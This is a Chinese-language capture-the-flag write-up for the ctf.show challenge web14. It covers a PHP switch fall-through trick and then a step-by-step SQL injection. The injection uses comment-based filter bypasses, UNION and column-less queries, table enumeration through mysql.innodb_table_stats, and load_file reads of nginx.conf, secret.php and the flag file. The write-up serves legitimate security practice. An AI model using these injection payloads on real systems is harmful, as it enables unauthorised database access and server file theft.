[web14](https://ctf.show/challenges#web14-46)

`nginx/1.20.1`

```php
<?php  
include("secret.php");  
  
if(isset($_GET['c'])){    $c = intval($_GET['c']);    sleep($c);  
    switch ($c) {  
        case 1:  
            echo '$url';  
            break;  
        case 2:  
            echo '@A@';  
            break;  
        case 555555:  
            echo $url;  
        case 44444:  
            echo "@A@";  
            break;  
        case 3333:  
            echo $url;  
            break;  
        case 222:  
            echo '@A@';  
            break;  
        case 222:  
            echo '@A@';  
            break;  
        case 3333:  
            echo $url;  
            break;  
        case 44444:  
            echo '@A@';  
        case 555555:  
            echo $url;  
            break;  
        case 3:  
            echo '@A@';  
        case 6000000:  
            echo "$url";  
        case 1:  
            echo '@A@';  
            break;  
    }  
}  
  
highlight_file(__FILE__);
```

猜测有关键的东西藏在了 `$url` 中，但是能输出 `$url` 的位置，都有特别长的 `sleep()`

## 绕 `switch`

注意这个地方：
```php
case 3:  
	echo '@A@';  
case 6000000:  
	echo "$url";  
```
在 `php` 中，双引号 `"` 里的变量是会被解析的，也就是说 `case 6000000:` 这里是会输出 `$url` 的。
并且， `case 3` 这个地方没有写 `break` ，执行完 `case 3` 之后就会把 `$url` 给输出出来。

所以我们
```url
?c=3
```
获得
```url
here_1s_your_f1ag.php
```

访问该网页，是一个查询框

## sql注入试探

对着查询框框框乱查， `1-4` 都是有值返回的，应该有SQL注入。

输入
```SQL
1&&1=2#
```
没东西了，再输入
```SQL
1||1=2#
```
有东西

很好，我们可以确定其有SQL注入。再输入
```SQL
1 || 1=2 #
```
甚至不跳转了，有空格过滤
```SQL
1/**/||/**/1=2#
```
ok可以绕过

测试一下回显位置
```sql
6/**/union/**/select/**/1#
```
显示1，回显位置就在此处

查一下数据库名
```sql
6/**/union/**/select/**/database()#
```
叫 `web`

## 绕 `information.tables`

获取一下表名
```sql
6/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
```
没东西，发现是 `information_schema.tables` 被ban了， `information_schema.columns` 也是

通过 `mysql.innodb_table_stats` 来获取
```sql
6/**/union/**/select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()#
```
查得只有一个表名 `content`

额，好像没什么用，最终还是用无列名查询吧。
```sql
1/**/and/**/(select/**/1/**/from/**/(select/**/*/**/from/**/content/**/union/**/select/**/1,2,3)/**/as/**/t/**/limit/**/1)#
```
查得 `content` 的列数为 3
```sql
6/**/union/**/select/**/(select/**/`3`/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)/**/as/**/t/**/limit/**/1,1)#
```
查得 `flag is not here!`
666

```sql
6/**/union/**/select/**/(select/**/`3`/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)/**/as/**/t/**/limit/**/2,1)#
```
查得 `wow,you can really dance`

```sql
6/**/union/**/select/**/(select/**/`3`/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)/**/as/**/t/**/limit/**/3,1)#
```

查得 `tell you a secret,secret has a secret...`

额，这他妈什么鬼。
操，意思是flag不在数据库里。

```sql
6/**/union/**/select/**/user()#
```
得到 `root@localhost`

http里有说明是 nginx
```sql
6/**/union/**/select/**/load_file("/etc/nginx/nginx.conf")#
```

```config
daemon off;

worker_processes  auto;

error_log  /var/log/nginx/error.log warn;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        root         /var/www/html;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location / {
            try_files $uri  $uri/ /index.php?$args;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }

    }
}
```

可以得知目录在 `/var/www/html`
那么根据提示查看 `secret.php`

```sql
6/**/union/**/select/**/load_file("/var/www/html/secret.php")#
```

```php
<!-- ReadMe -->
<?php
$url = 'here_1s_your_f1ag.php';
$file = '/tmp/gtf1y';
if(trim(@file_get_contents($file)) === 'ctf.show'){
	echo file_get_contents('/real_flag_is_here');
}
```

```sql
6/**/union/**/select/**/load_file("/real_flag_is_here")#
```